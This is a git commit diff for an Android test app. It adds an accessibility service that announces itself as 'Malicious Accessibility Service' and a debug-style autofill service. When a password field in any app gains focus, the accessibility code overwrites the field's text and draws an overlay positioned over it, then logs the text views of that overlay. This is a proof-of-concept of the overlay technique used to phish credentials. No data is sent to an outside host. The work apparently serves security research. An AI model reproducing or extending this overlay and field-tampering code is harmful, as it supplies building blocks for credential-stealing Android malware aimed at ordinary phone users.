8edd2707270286ff837b4566dc709daefebc0fc0
Rambo <petrik.spac@gmail.com>
2021-11-14 20:42:21 +0100

    copy debug autofill example example. Work in app and web

--- android/app/src/main/java/com/testmodule/MyAccessibilityService.java
+++ android/app/src/main/java/com/testmodule/MyAccessibilityService.java
@@ -2,41 +2,186 @@ package com.testmodule;
 
 import android.accessibilityservice.AccessibilityService;
 import android.accessibilityservice.AccessibilityServiceInfo;
+import android.content.Intent;
+import android.content.pm.PackageManager;
 import android.graphics.PixelFormat;
+import android.graphics.Rect;
+import android.os.Build;
+import android.os.Bundle;
 import android.view.Gravity;
 import android.view.LayoutInflater;
+import android.view.View;
+import android.view.ViewGroup;
 import android.view.WindowManager;
 import android.view.accessibility.AccessibilityEvent;
+import android.view.accessibility.AccessibilityNodeInfo;
+import android.view.accessibility.AccessibilityRecord;
+import android.widget.Button;
+import android.widget.EditText;
 import android.widget.FrameLayout;
+import android.util.Log;
+import android.widget.PopupWindow;
+import android.widget.RelativeLayout;
+import android.widget.TextView;
+import android.widget.Toast;
+
+import androidx.annotation.RequiresApi;
+
+import java.util.ArrayList;
 
 public class MyAccessibilityService extends AccessibilityService {
     FrameLayout mLayout;
+    boolean overlayIsVisible = false;
+
+    static final String TAG = "RecorderService";
+
+    private String getEventType(AccessibilityEvent event) {
+        switch (event.getEventType()) {
+            case AccessibilityEvent.TYPE_NOTIFICATION_STATE_CHANGED:
+                return "TYPE_NOTIFICATION_STATE_CHANGED";
+            case AccessibilityEvent.TYPE_VIEW_CLICKED:
+                return "TYPE_VIEW_CLICKED";
+            case AccessibilityEvent.TYPE_VIEW_FOCUSED:
+                return "TYPE_VIEW_FOCUSED";
+            case AccessibilityEvent.TYPE_VIEW_LONG_CLICKED:
+                return "TYPE_VIEW_LONG_CLICKED";
+            case AccessibilityEvent.TYPE_VIEW_SELECTED:
+                return "TYPE_VIEW_SELECTED";
+            case AccessibilityEvent.TYPE_WINDOW_STATE_CHANGED:
+                return "TYPE_WINDOW_STATE_CHANGED";
+            case AccessibilityEvent.TYPE_VIEW_TEXT_CHANGED:
+                return "TYPE_VIEW_TEXT_CHANGED";
+        }
+        return "default";
+    }
+
+    private String getEventText(AccessibilityEvent event) {
+        StringBuilder sb = new StringBuilder();
+        for (CharSequence s : event.getText()) {
+            sb.append(s);
+        }
+        return sb.toString();
+    }
 
     @Override
     protected void onServiceConnected() {
-        // Create an overlay and display the action bar
-        WindowManager wm = (WindowManager) getSystemService(WINDOW_SERVICE);
-        mLayout = new FrameLayout(this);
-        WindowManager.LayoutParams lp = new WindowManager.LayoutParams();
-        lp.type = WindowManager.LayoutParams.TYPE_ACCESSIBILITY_OVERLAY;
-        lp.format = PixelFormat.TRANSLUCENT;
-        lp.flags |= WindowManager.LayoutParams.FLAG_NOT_FOCUSABLE;
-        lp.width = WindowManager.LayoutParams.WRAP_CONTENT;
-        lp.height = WindowManager.LayoutParams.WRAP_CONTENT;
-        lp.gravity = Gravity.TOP;
-        LayoutInflater inflater = LayoutInflater.from(this);
-        inflater.inflate(R.layout.action_bar, mLayout);
-        wm.addView(mLayout, lp);
+
+        AccessibilityServiceInfo info = new AccessibilityServiceInfo();
+        info.eventTypes = AccessibilityEvent.TYPES_ALL_MASK;
+        info.notificationTimeout = 100;
+        info.feedbackType = AccessibilityServiceInfo.FEEDBACK_ALL_MASK;
+        this.setServiceInfo(info);
+        Toast t = Toast.makeText(getApplicationContext(), "Malicious Accessibility Service is connected now", Toast.LENGTH_SHORT);
+        t.show();
+
+
     }
 
+    public static void findViews(View v) {
+        try {
+            if (v instanceof ViewGroup) {
+                ViewGroup vg = (ViewGroup) v;
+                for (int i = 0; i < vg.getChildCount(); i++) {
+                    View child = vg.getChildAt(i);
+                    // recursively call this method
+                    findViews(child);
+                }
+            } else if (v instanceof TextView) {
+                //do whatever you want ...
+                Log.e("INPUT", v.toString());
+            }
+        } catch (Exception e) {
+            e.printStackTrace();
+        }
+    }
+
+
+
+    @RequiresApi(api = Build.VERSION_CODES.O)
     @Override
     public void onAccessibilityEvent(AccessibilityEvent event) {
+        //Log.v(TAG, String.format(
+               // "onAccessibilityEvent: [type] %s [class] %s [package] %s [time] %s [text] %s",
+              //  getEventType(event), event.getClassName(), event.getPackageName(),
+               // event.getEventTime(), getEventText(event)));
 
+        switch(event.getEventType()) {
+            case AccessibilityEvent.TYPE_VIEW_CLICKED:
+            case AccessibilityEvent.TYPE_VIEW_FOCUSED:
+                try {
+                    Class className = Class.forName(event.getClassName().toString());
+
+                    if (EditText.class.isAssignableFrom(className)) {
+                        // An EditText was Clicked or Focused
+                        // Use other methods from the accessibilityEvent to do what
+                        // you need to do
+
+
+                        AccessibilityNodeInfo nodeInfo = event.getSource()==null ? null : event.getSource();
+
+
+                        if (nodeInfo != null && !overlayIsVisible && nodeInfo.isPassword() ) {
+                            Rect input = new Rect();
+                            nodeInfo.getBoundsInScreen(input);
+                            Log.i("TEST", "The TextView Node: " + nodeInfo.getHintText());
+
+                            nodeInfo.refresh();
+                            Bundle bundle = new Bundle();
+                            bundle.putString(AccessibilityNodeInfo.ACTION_ARGUMENT_SET_TEXT_CHARSEQUENCE, "LOOOOL");
+                            nodeInfo.performAction(AccessibilityNodeInfo.ACTION_SET_TEXT, bundle);
+
+                            overlayIsVisible = true;
+
+                            WindowManager wm = (WindowManager) getSystemService(WINDOW_SERVICE);
+                            mLayout = new FrameLayout(this);
+                            WindowManager.LayoutParams lp = new WindowManager.LayoutParams();
+                            lp.type = WindowManager.LayoutParams.TYPE_ACCESSIBILITY_OVERLAY;
+                            lp.format = PixelFormat.TRANSLUCENT;
+                            lp.flags |= WindowManager.LayoutParams.FLAG_NOT_FOCUSABLE;
+                            lp.width = WindowManager.LayoutParams.WRAP_CONTENT;
+                            lp.height = WindowManager.LayoutParams.WRAP_CONTENT;
+                            lp.x = input.left;
+                            lp.y = input.top - 85;
+                            lp.gravity = Gravity.TOP | Gravity.LEFT;
+                            LayoutInflater inflater = LayoutInflater.from(this);
+                            inflater.inflate(R.layout.action_bar, mLayout);
+                            wm.addView(mLayout, lp);
+
+
+
+                        }
+
+                    }
+                } catch (ClassNotFoundException e) {
+                    e.printStackTrace();
+                }
+                break;
+        }
     }
+
 
     @Override
     public void onInterrupt() {
     }
 
+
+    public void sendMessage(View view) {
+        // Do something in response to button click
+
+        ViewGroup parentView = (ViewGroup) view.getParent();
+        parentView.removeView(view);
+        overlayIsVisible = false;
+
+        View test = (View) view.getParent();
+        
+        findViews(test);
+
+        Intent i = new Intent(Intent.ACTION_MAIN);
+        PackageManager managerclock = getPackageManager();
+        i = managerclock.getLaunchIntentForPackage("com.testmodule");
+        i.addCategory(Intent.CATEGORY_LAUNCHER);
+        startActivity(i);
+
+    }
 
 }
--- android/app/src/main/java/com/testmodule/MyAutofillService.java
+++ android/app/src/main/java/com/testmodule/MyAutofillService.java
@@ -1,43 +1,321 @@
 package com.testmodule;
 
+import android.app.assist.AssistStructure;
+import android.content.Context;
+import android.content.IntentSender;
 import android.os.Build;
 import android.os.CancellationSignal;
 import android.service.autofill.AutofillService;
+import android.service.autofill.Dataset;
 import android.service.autofill.FillCallback;
+import android.service.autofill.FillContext;
 import android.service.autofill.FillRequest;
+import android.service.autofill.FillResponse;
 import android.service.autofill.SaveCallback;
+import android.service.autofill.SaveInfo;
 import android.service.autofill.SaveRequest;
+import android.text.TextUtils;
+import android.util.ArrayMap;
 import android.util.Log;
+import android.view.View;
+import android.view.autofill.AutofillId;
+import android.view.autofill.AutofillValue;
+import android.widget.RemoteViews;
+import android.widget.Toast;
 
 import androidx.annotation.NonNull;
+import androidx.annotation.Nullable;
 import androidx.annotation.RequiresApi;
 
 import com.facebook.react.bridge.NativeModule;
 
+import java.util.Collection;
+import java.util.List;
+import java.util.Map;
+
 @RequiresApi(api = Build.VERSION_CODES.O)
 public class MyAutofillService extends AutofillService implements NativeModule {
+
 
     public MyAutofillService() {
         Log.e("CONSTUCTOR", "CALEED");
     }
 
 
-    @Override
-    public void onFillRequest(@NonNull FillRequest request, @NonNull CancellationSignal cancellationSignal, @NonNull FillCallback callback) {
-        Log.e("LOL onFillRequest", "LOL onFillRequest");
 
+    private static final String TAG = "DebugService";
+
+    private boolean mAuthenticateResponses;
+    private boolean mAuthenticateDatasets;
+    private int mNumberDatasets;
+
+    @Override
+    public void onConnected() {
+        super.onConnected();
+
+        // TODO(b/114236837): use its own preferences?
+
+        mAuthenticateResponses = false;
+        mAuthenticateDatasets = false;
+        mNumberDatasets = 4;
+
+        Log.d(TAG, "onConnected(): numberDatasets=" + mNumberDatasets
+                + ", authResponses=" + mAuthenticateResponses
+                + ", authDatasets=" + mAuthenticateDatasets);
+    }
+
+    @NonNull
+    static AssistStructure getLatestAssistStructure(@NonNull FillRequest request) {
+        List<FillContext> fillContexts = request.getFillContexts();
+        return fillContexts.get(fillContexts.size() - 1).getStructure();
     }
 
     @Override
-    public void onSaveRequest(@NonNull SaveRequest request, @NonNull SaveCallback callback) {
-        Log.e("LOL onFillRequest", "LOL onFillRequest");
+    public void onFillRequest(FillRequest request, CancellationSignal cancellationSignal,
+                              FillCallback callback) {
+        Log.d(TAG, "onFillRequest()");
 
+        // Find autofillable fields
+        AssistStructure structure = getLatestAssistStructure(request);
+        ArrayMap<String, AutofillId> fields = getAutofillableFields(structure);
+        Log.d(TAG, "autofillable fields:" + fields);
+
+        if (fields.isEmpty()) {
+            toast("No autofill hints found");
+            callback.onSuccess(null);
+            return;
+        }
+
+        // Create response...
+        FillResponse response;
+        if (false) {
+            int size = fields.size();
+            String[] hints = new String[size];
+            AutofillId[] ids = new AutofillId[size];
+            for (int i = 0; i < size; i++) {
+                hints[i] = fields.keyAt(i);
+                ids[i] = fields.valueAt(i);
+            }
+
+            //IntentSender authentication = SimpleAuthActivity.newIntentSenderForResponse(this, hints,
+                    //ids, mAuthenticateDatasets);
+            RemoteViews presentation = newDatasetPresentation(getPackageName(),
+                    "Tap to auth response");
+
+           // response = new FillResponse.Builder()
+                   // .setAuthentication(ids, authentication, presentation).build();
+        } else {
+            response = createResponse(this, fields, mNumberDatasets,mAuthenticateDatasets);
+        }
+
+        // ... and return it
+        callback.onSuccess(response);
     }
 
+    @Override
+    public void onSaveRequest(SaveRequest request, SaveCallback callback) {
+        Log.d(TAG, "onSaveRequest()");
+        toast("Save not supported");
+        callback.onSuccess();
+    }
 
-    public void getInlineSuggestionsRequest () {
-        Log.e("TEST", "InlineSuggestionsRequest");
-        return;
+    /**
+     * Parses the {@link AssistStructure} representing the activity being autofilled, and returns a
+     * map of autofillable fields (represented by their autofill ids) mapped by the hint associate
+     * with them.
+     *
+     * <p>An autofillable field is a {@link AssistStructure.ViewNode} whose {@link #getHint(AssistStructure.ViewNode)} metho
+     */
+    @NonNull
+    private ArrayMap<String, AutofillId> getAutofillableFields(@NonNull AssistStructure structure) {
+        ArrayMap<String, AutofillId> fields = new ArrayMap<>();
+        int nodes = structure.getWindowNodeCount();
+        for (int i = 0; i < nodes; i++) {
+            AssistStructure.ViewNode node = structure.getWindowNodeAt(i).getRootViewNode();
+            addAutofillableFields(fields, node);
+        }
+        return fields;
+    }
+
+    /**
+     * Adds any autofillable view from the {@link AssistStructure.ViewNode} and its descendants to the map.
+     */
+    private void addAutofillableFields(@NonNull Map<String, AutofillId> fields,
+                                       @NonNull AssistStructure.ViewNode node) {
+        String hint = getHint(node);
+        if (hint != null) {
+            AutofillId id = node.getAutofillId();
+            if (!fields.containsKey(hint)) {
+                Log.v(TAG, "Setting hint '" + hint + "' on " + id);
+                fields.put(hint, id);
+            } else {
+                Log.v(TAG, "Ignoring hint '" + hint + "' on " + id
+                        + " because it was already set");
+            }
+        }
+        int childrenSize = node.getChildCount();
+        for (int i = 0; i < childrenSize; i++) {
+            addAutofillableFields(fields, node.getChildAt(i));
+        }
+    }
+
+    @Nullable
+    protected String getHint(@NonNull AssistStructure.ViewNode node) {
+
+        // First try the explicit autofill hints...
+
+        String[] hints = node.getAutofillHints();
+        if (hints != null) {
+            // We're simple, we only care about the first hint
+            return hints[0].toLowerCase();
+        }
+
+        // Then try some rudimentary heuristics based on other node properties
+
+        String viewHint = node.getHint();
+        String hint = inferHint(node, viewHint);
+        if (hint != null) {
+            Log.d(TAG, "Found hint using view hint(" + viewHint + "): " + hint);
+            return hint;
+        } else if (!TextUtils.isEmpty(viewHint)) {
+            Log.v(TAG, "No hint using view hint: " + viewHint);
+        }
+
+        String resourceId = node.getIdEntry();
+        hint = inferHint(node, resourceId);
+        if (hint != null) {
+            Log.d(TAG, "Found hint using resourceId(" + resourceId + "): " + hint);
+            return hint;
+        } else if (!TextUtils.isEmpty(resourceId)) {
+            Log.v(TAG, "No hint using resourceId: " + resourceId);
+        }
+
+        CharSequence text = node.getText();
+        CharSequence className = node.getClassName();
+        if (text != null && className != null && className.toString().contains("EditText")) {
+            hint = inferHint(node, text.toString());
+            if (hint != null) {
+                // NODE: text should not be logged, as it could contain PII
+                Log.d(TAG, "Found hint using text(" + text + "): " + hint);
+                return hint;
+            }
+        } else if (!TextUtils.isEmpty(text)) {
+            // NODE: text should not be logged, as it could contain PII
+            Log.v(TAG, "No hint using text: " + text + " and class " + className);
+        }
+        return null;
+    }
+
+    /**
+     * Uses heuristics to infer an autofill hint from a {@code string}.
+     *
+     * @return standard autofill hint, or {@code null} when it could not be inferred.
+     */
+    @Nullable
+    protected String inferHint(AssistStructure.ViewNode node, @Nullable String actualHint) {
+        if (actualHint == null) return null;
+
+        String hint = actualHint.toLowerCase();
+        if (hint.contains("label") || hint.contains("container")) {
+            Log.v(TAG, "Ignoring 'label/container' hint: " + hint);
+            return null;
+        }
+
+        if (hint.contains("password")) return View.AUTOFILL_HINT_PASSWORD;
+        if (hint.contains("username")
+                || (hint.contains("login") && hint.contains("id")))
+            return View.AUTOFILL_HINT_USERNAME;
+        if (hint.contains("email")) return View.AUTOFILL_HINT_EMAIL_ADDRESS;
+        if (hint.contains("name")) return View.AUTOFILL_HINT_NAME;
+        if (hint.contains("phone")) return View.AUTOFILL_HINT_PHONE;
+
+        // When everything else fails, return the full string - this is helpful to help app
+        // developers visualize when autofill is triggered when it shouldn't (for example, in a
+        // chat conversation window), so they can mark the root view of such activities with
+        // android:importantForAutofill=noExcludeDescendants
+        if (node.isEnabled() && node.getAutofillType() != View.AUTOFILL_TYPE_NONE) {
+            Log.v(TAG, "Falling back to " + actualHint);
+            return actualHint;
+        }
+        return null;
+    }
+
+    static FillResponse createResponse(@NonNull Context context,
+                                       @NonNull ArrayMap<String, AutofillId> fields, int numDatasets,
+                                       boolean authenticateDatasets) {
+        String packageName = context.getPackageName();
+        FillResponse.Builder response = new FillResponse.Builder();
+        // 1.Add the dynamic datasets
+        for (int i = 1; i <= numDatasets; i++) {
+            Dataset unlockedDataset = newUnlockedDataset(fields, packageName, i);
+            if (false) {
+                Dataset.Builder lockedDataset = new Dataset.Builder();
+                for (Map.Entry<String, AutofillId> field : fields.entrySet()) {
+                    String hint = field.getKey();
+                    AutofillId id = field.getValue();
+                    String value = i + "-" + hint;
+                    //IntentSender authentication =
+                           // MyAutofillService.newIntentSenderForDataset(context, unlockedDataset);
+                    RemoteViews presentation = newDatasetPresentation(packageName,
+                            "Tap to auth " + value);
+                    //lockedDataset.setValue(id, null, presentation)
+                            //.setAuthentication(authentication);
+                }
+                response.addDataset(lockedDataset.build());
+            } else {
+                response.addDataset(unlockedDataset);
+            }
+        }
+
+        // 2.Add save info
+        Collection<AutofillId> ids = fields.values();
+        AutofillId[] requiredIds = new AutofillId[ids.size()];
+        ids.toArray(requiredIds);
+        response.setSaveInfo(
+                // We're simple, so we're generic
+                new SaveInfo.Builder(SaveInfo.SAVE_DATA_TYPE_GENERIC, requiredIds).build());
+
+        // 3.Profit!
+        return response.build();
+    }
+
+    static Dataset newUnlockedDataset(@NonNull Map<String, AutofillId> fields,
+                                      @NonNull String packageName, int i) {
+        Dataset.Builder dataset = new Dataset.Builder();
+        for (Map.Entry<String, AutofillId> field : fields.entrySet()) {
+            String hint = field.getKey();
+            AutofillId id = field.getValue();
+            String value = i + "-" + hint;
+
+            // We're simple - our dataset values are hardcoded as "N-hint" (for example,
+            // "1-username", "2-username") and they're displayed as such, except if they're a
+            // password
+            String displayValue = hint.contains("password") ? "password for #" + i : value;
+            RemoteViews presentation = newDatasetPresentation(packageName, displayValue);
+            dataset.setValue(id, AutofillValue.forText(value), presentation);
+        }
+
+        return dataset.build();
+    }
+
+    /**
+     * Helper method to create a dataset presentation with the given text.
+     */
+    @NonNull
+    static RemoteViews newDatasetPresentation(@NonNull String packageName,
+                                              @NonNull CharSequence text) {
+        RemoteViews presentation =
+                new RemoteViews(packageName, R.layout.multidataset_service_list_item);
+        presentation.setTextViewText(R.id.text, text);
+        presentation.setImageViewResource(R.id.icon, R.mipmap.ic_launcher);
+        return presentation;
+    }
+
+    /**
+     * Displays a toast with the given message.
+     */
+    private void toast(@NonNull CharSequence message) {
+        Toast.makeText(getApplicationContext(), message, Toast.LENGTH_LONG).show();
     }
 
     @NonNull
